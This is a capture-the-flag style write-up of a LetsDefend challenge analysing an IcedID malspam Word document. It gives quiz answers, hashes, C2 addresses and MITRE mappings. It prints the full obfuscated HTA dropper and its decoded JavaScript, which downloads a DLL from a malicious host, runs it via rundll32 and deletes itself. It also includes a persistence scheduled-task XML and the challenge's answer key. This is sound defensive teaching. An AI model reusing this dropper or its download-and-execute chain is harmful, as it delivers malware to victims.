---
title: IceID Malicious Doc Analysis
---

**Description: Performing malware analysis on a malicious document from the IceID malware family**
Let's Defend IcedID Malware Family - https://app.letsdefend.io/challenge/IcedID-Malware-Family/

1. What is the sha256 hash for the malspam attachment?

`cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1`

This can be found by running `sha256sum <malspam document>` on Linux:

2. What is the child process command line when the user enabled the Macro?

`explorer.exe collectionBoxConst.hta`

Now that we have the malicious Word document, we can check it for macros using [oleVBA](https://github.com/decalage2/oletools/wiki/olevba) to analyze the document. I am using Remnux's VM which comes with *oleVBA* preinstalled, so I simply have to run:

`olevba doc.doc`:

which outputs:

![](https://i.imgur.com/XbBugon.png)

`Sub autoopen()` is a function named `AutoOpen()`, and it'll be executed as soon as the victim enables macros on the malicious document.

So when the victim enables macros, `Shell` will execute `explorer.exe collectionBoxConst.hta` which opens the `.hta` file. We have the `.hta` file referenced here and will analyze it further in the next tasks.

3. What is the HTML Application file's sha256 hash from previous question?

`8062bf9248451706c9c2007e1772e51268f299d5253cbd9ef327dd829c51755b`

This can be found by running `sha256sum <HTML Application Filename>.hta`

4. Based on the previous question, what is the DLL run method?

`"C:\Windows\System32\rundll32.exe" c:\users\public\collectionBoxConst.jpg,PluginInit`

Now we're asked to give the DLL run method, so we know there's a DLL file associated with the `collectionBoxConst.hta` file somehow. 

The content of the `collectionBoxConst.hta` file is:

![](https://i.imgur.com/KYyvfmI.png)

And here is a text representation:

```html
html>
body>
div id='copyCurrencyMemory'>fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=aGVsbG8fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=aGVsbG8msscriptcontrol.scriptcontrol</div><div id='vConstBorder'>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</div>

script language='javascript'>
function WLongPtr(altListVba){return(new ActiveXObject(altListVba));}function objButtBool(headerListbox){return(removeConstFunction.getElementById(headerListbox).innerHTML);}function boolOptionClass(){return(objButtBool('vConstBorder'));}function sinBooleanCur(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var memSetByte=''; var w=String.fromCharCode; var L=s.length;var intBorder = zeroI('tArahc');for(i=0;i<64;i++){e[boolOptionClass()[intBorder](i)]=i;}for(x=0;x<L;x++){c=e[s[intBorder](x)];b=(b<<6)+c;l+=6;while(l>=8){((a=(b>>>(l-=8))&0xff)||(x<(L-2)))&&(memSetByte+=w(a));}}return(memSetByte);};function zeroI(genTempTextbox){return genTempTextbox.split('').reverse().join('');}procDocumentI = window;removeConstFunction = document;procDocumentI.resizeTo(1, 1);procDocumentI.moveTo(-100, -100);var genericBoolean = removeConstFunction.getElementById('copyCurrencyMemory').innerHTML.split("aGVsbG8");var collectRightSingle = zeroI(sinBooleanCur(genericBoolean[0]));var vData = zeroI(sinBooleanCur(genericBoolean[1]));var viewPointerConvert = genericBoolean[2];
/script>

script language='vbscript'>Function classResponseLocal(copyCurrencyMemory) : Set snglSngTpl = CreateObject(viewPointerConvert) : With snglSngTpl : .language = "jscript" : .timeout = 60000 : .eval(copyCurrencyMemory) : End With : End Function

/script>
script language='vbscript'>Call classResponseLocal(collectRightSingle)
/script>

script language='vbscript'>Call classResponseLocal(vData)</script script language='javascript'>procDocumentI['close']();
/script>
/body>
/html>
```

We can see that there's a large base64 string, but if we try to decode it all at once, we get gibberish mixed with garbage data:

![](https://i.imgur.com/c1LgzZZ.png)

But if we look deeper at the Javascript of the HTML, we can determine that the base64 encoded data is being split by `aGVsbG8`, which means this is meant to separate 2 base64 encoded data chunks.

* If we decode `aGVsbG8`, it is *hello* (:

So if we don't include the `aGVsbG8` string and instead split the base64 chunks on this string, we end up with these 2 chunks:

1. `fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=`
2. `fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=`

And if we decode both, we end up with:

1. `}}{)e(hctac};esolc.tsLrav;)2 ,"gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c"(elifotevas.tsLrav;)ydobesnopser.RregetnIetad(etirw.tsLrav;1 = epyt.tsLrav;nepo.tsLrav;)"maerts.bdoda"(tcejbOXevitcA wen = tsLrav rav{yrt{)002 == sutats.RregetnIetad(fi;)(dnes.RregetnIetad;)eslaf ,"CXMjOoGT42CWbM76s1cwD=q&09MknlQvZGBAF2DdFRVyL12ggVZu=hcraes&T292DoMHm=resu&fp4rV=di&yeDPOXdDP6I4hWx9jh=q&nfUg0s9ZtCaVy=uJwS9y9i&Ji8n2K1=egap&nFveIrHy5FLZ11XUyD4gcboq0=emit&vbfkIsRna=resu?5esos/NPIrGgkP6RAAHVVKCceRx0VVB6TutLzziNQJ/7YWxiQAkOnOBx5/T/adda/moc.zerulccmesruoc//:ptth" ,"TEG"(nepo.RregetnIetad;)"ptthlmx.2lmxsm"(tcejbOXevitcA wen = RregetnIetad`
2. `}{)txeNxednIxedni(hctac};)tcejbOVoper(elifeteled.tcurtSLsetyb;"ath.tsnoCxoBnoitcelloc\\" + yrotceriDtnerruC.tsnoCecnerefeRtsurt = tcejbOVoper{yrt;)"tinInigulP,gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c 23lldnur"(nur.tsnoCecnerefeRtsurt;)"tcejbometsyselif.gnitpircs"(tcejbOXevitcA wen = tcurtSLsetyb rav;)"llehs.tpircsw"(tcejbOXevitcA wen = tsnoCecnerefeRtsurt rav`

More seemingly garbage data, but if you look closely, you'll notice that there appears to be a file path in both strings. And if you read through the Javascript within the `.hta` file, you'll also notice that in addition to splitting the data on `aGVsbG8`, it also reverses the data chunks, so it's simply backwards.

We can replicate this in Python by running:

```python3
print(garbageString[::-1])
```

where `garbageString` is our backwards data. This will result in:

```Javascript
dateIntegerR = new ActiveXObject("msxml2.xmlhttp");dateIntegerR.open("GET", "hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&time=0qobcg4DyUX11ZLF5yHrIevFn&page=1K2n8iJ&i9y9SwJu=yVaCtZ9s0gUfn&q=hj9xWh4I6PDdXOPDey&id=Vr4pf&user=mHMoD292T&search=uZVgg21LyVRFdD2FABGZvQlnkM90&q=Dwc1s67MbWC24TGoOjMXC", false);dateIntegerR.send();if(dateIntegerR.status == 200){try{var varLst = new ActiveXObject("adodb.stream");varLst.open;varLst.type = 1;varLst.write(dateIntegerR.responsebody);varLst.savetofile("c:\users\public\collectionBoxConst.jpg", 2);varLst.close;}catch(e){}}

trustReferenceConst = new ActiveXObject("wscript.shell");var bytesLStruct = new ActiveXObject("scripting.filesystemobject");trustReferenceConst.run("rundll32 c:\users\public\collectionBoxConst.jpg,PluginInit");try{repoVObject = trustReferenceConst.CurrentDirectory + "\collectionBoxConst.hta";bytesLStruct.deletefile(repoVObject);}catch(indexIndexNext){}
```

The first half will:

* Make a GET request to hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&time=0qobcg4DyUX11ZLF5yHrIevFn&page=1K2n8iJ&i9y9SwJu=yVaCtZ9s0gUfn&q=hj9xWh4I6PDdXOPDey&id=Vr4pf&user=mHMoD292T&search=uZVgg21LyVRFdD2FABGZvQlnkM90&q=Dwc1s67MbWC24TGoOjMXC
* Then save the response data from the GET request to a file located at `C:\Users\Public\collectionBoxConst.jpg`

The second half will:

* Execute the commandline: `rundll32 C:\Users\Public\collectionBoxConst.jpg,PluginInit`
* Delete the `collectionBoxConst.hta` file

The apparent `.jpg` file clearly isn't a `.jpg` file, but rather a *Dynamic Link Library* (`.dll`) file. This can further be confirmed by running the `file` utility on the file, which returns:

`PE32+ executable (DLL) (GUI) x86-64, for MS Windows`

5. What is the image file dll installer sha256 hash from previous question?

`51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441`

This question is referring to the `.dll` file with the `.jpg` file extension which was downloaded.

We can determine the sha256 hash by running this command in Linux:

`sha256sum <filename>.dll`

6. What are the IP address and its domain name hosted installer DLL?

`45.142.213.105, coursemcclurez.com`

This question is asking about the domain and IP address that the `collectionBoxConst.dll` file was downloaded from. Recall that the full URL was: 

`hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&time=0qobcg4DyUX11ZLF5yHrIevFn&page=1K2n8iJ&i9y9SwJu=yVaCtZ9s0gUfn&q=hj9xWh4I6PDdXOPDey&id=Vr4pf&user=mHMoD292T&search=uZVgg21LyVRFdD2FABGZvQlnkM90&q=Dwc1s67MbWC24TGoOjMXC`

So we know the domain is: `coursemcclurez[.]com`

And if we input this into VirusTotal:

![](https://i.imgur.com/WYUneba.png)

Now we have the IP address!

7. What is the full URL for the DLL installer?

`hxxp //coursemcclurez.com/adda/T/5xBOnOkAQixWY7/JQNizzLtuT6BVV0xRecCKVVHAAR6PkgGrIPN/sose5?user=anRsIkfbv&time=0qobcg4DyUX11ZLF5yHrIevFn&page=1K2n8iJ&i9y9SwJu=yVaCtZ9s0gUfn&q=hj9xWh4I6PDdXOPDey&id=Vr4pf&user=mHMoD292T&search=uZVgg21LyVRFdD2FABGZvQlnkM90&q=Dwc1s67MbWC24TGoOjMXC`

8. What are the two IP addresses identified as C2 servers?

`185.33.85.35, 194.5.249.46`

If we filter for only `dns` packets in the packet capture, we can see that there's a lot more domains than the `coursemcclurez[.]com` being queried:

![](https://i.imgur.com/oP2qPoQ.png)

Many of the domains are being resolved to the IP address `185.33.85.35`, and we were already aware of the `45.142.213.105` domain which is associated to `coursemcclurez[.]com`.

This only leaves 3 other potential C2 server IP addresses:

* `172.67.169.59`
* `194.5.249.46`
* `65.8.218.70`

The two which appear suspicious due to the domains they're associated with are `172.67.169.59` (`supplementik[.]top`) & `194.5.249.46` (`extrimefigim[.]top`)

After trying both IP addresses as answers, only `194.5.249.46` was accepted.

9. What are the four C2 domains identified in the PCAP file?

`arhannexa5.top, extrimefigim.top, fimlubindu.top, kilodaser4.fit`

We know that the C2 IP addresses are `185.33.85.35` & `194.5.249.46`, so now we simply have to look through the captured DNS packets and search for domain queries which resolved to either of these C2 IP addresses. We can type *dns* into the search filter to only look at DNS packets:

![](https://i.imgur.com/OL2cSk0.png)

10. After the DLL installer being executed, what are the two domains that were being contacted by the installer DLL?

`aws.amazon.com, supplementik.top`

To solve this, we must look for when the DLL installer was downloaded, then look at the packets after this event occurred. We know that the domain that the DLL installer was downloaded from is `coursemcclurez[.]com`, and we know that the machine must request the IP address for this domain before it can download the DLL or contact the domain for anything, so we can start by looking for the packet which answered this DNS query packet, then looking at the packets after that DNS query was resolved:

![](https://i.imgur.com/GMiVLBP.png)

Now we know that in packet 2, the DNS query is resolved. Now we can assume that after packet 2, the DLL is now downloaded and that every DNS query after packet 2 is going to occur after the DLL is executed.

We see there's 2 more DNS queries:

![](https://i.imgur.com/fL1yaoN.png)

![](https://i.imgur.com/P9LVBUN.png)

One for `aws.amazon[.]com` & another for `supplementik[.]top`, both of which we can assume occurred after the DLL was downloaded and executed.

11. The malware generated traffic to an IP address over port 8080 with two SYN requests, what is the IP address?

`38.135.122.194`

This can be solved by looking at the `.pcap` capture file and entering: `tcp.port == 8080` as a display filter which outputs:

![](https://i.imgur.com/wtBK8ey.png)

And if we scroll through the packets displayed, we can determine that the only IP addresses associated with any communications on port 8080 are between `10.6.2.103` (The source) and `38.135.122.194` (The destination).

12. The license.dat file was used to create persistance on the user's machine, what is the dll run method for the persistance?

`C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll",update /i:"ComicFantasy\license.dat`

The contents of `2021-06-02-scheduled-task.txt` will point us in the correct direction for this question:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\{B9C2BAC4-FDCF-449C-896A-9BEA1C23FBE8}</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger id="TimeTrigger">
      <Repetition>
        <Interval>PT1H</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2012-01-01T12:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
    <LogonTrigger id="LogonTrigger">
      <Enabled>true</Enabled>
      <UserId>user1</UserId>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>rundll32.exe</Command>
      <Arguments>"C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll",update /i:"ComicFantasy\license.dat"</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>LAPTOP-SH63S8O\user1</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

This is an XML configuration file for a scheduled task, the `<Exec>` portion is what we should focus on:

```xml
<Exec>
      <Command>rundll32.exe</Command>
      <Arguments>"C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll",update /i:"ComicFantasy\license.dat"</Arguments>
    </Exec>
```

This will set a scheduled task which will run `rundll32.exe "C:\Users\user1\AppData\Local\user1\Tetoomdu64.dll",update /i:"ComicFantasy\license.dat"`. But our question is only interested in the arguments supplied to the executed command.

13. With OSINT, what is the malware family name used in this PCAP capture?

`IcedID`

This can be determined by taking an MD5 hash of the files (`.doc`, `.dll`, `.hta`) & searching them on VirusTotal:

![](https://i.imgur.com/xt9cDf5.png)

![](https://i.imgur.com/lLW26oR.png)

![](https://i.imgur.com/yGD5eNA.png)

The general consensus of VirusTotal is that this malware belongs to the IcedID family. This can be further confirmed by the challenge name.

14. Based on Palo Alto Unit 42, what is the APT Group name?

`TA551`

This can be found by simply searching "Palo Alto Unit 42 IcedID Malware" on your favorite search engine!

15. What is the Mitre Attack code for the initial access in this campaign?

`T1566.001`

Since we have the APT group name, `TA551`, we can search Mitre's ATT&CK database which holds information regarding known threats and their tactics and techniques.

Then we'll be presented with a table of the techniques employed by this group, then we have to find the one which matches up. According to the Palo Alto article, this infection begins wwith a malicious email which contains an attachment:

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2021/01/word-image-15.jpeg)

And if we scroll through the techniques employed by TA551, we see *Phishing: Spearphishing Attachment* which has an ID of T1566.001:

![](https://i.imgur.com/vEySoMA.png)

*NOTE: The description doesn't fit exactly with what we've analyzed*

## References

* https://github.com/decalage2/oletools/wiki/olevba
* https://attack.mitre.org/software/S0483/
* https://www.virustotal.com/gui/file/3ed5d0476d1ce4fd325666072983d295609fe94c5b65d5db47a53f462ac7a4dc
* https://www.virustotal.com/gui/file/cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1/behavior/C2AE
* https://www.virustotal.com/gui/url/09023b31dcd25e698084fed4f683430d250bf473a1d717ba459a4cb68932c5df/detection
* https://www.virustotal.com/gui/file/51658887e46c88ed6d5861861a55c989d256a7962fb848fe833096ed6b049441/detection
* https://unit42.paloaltonetworks.com/ta551-shathak-icedid/

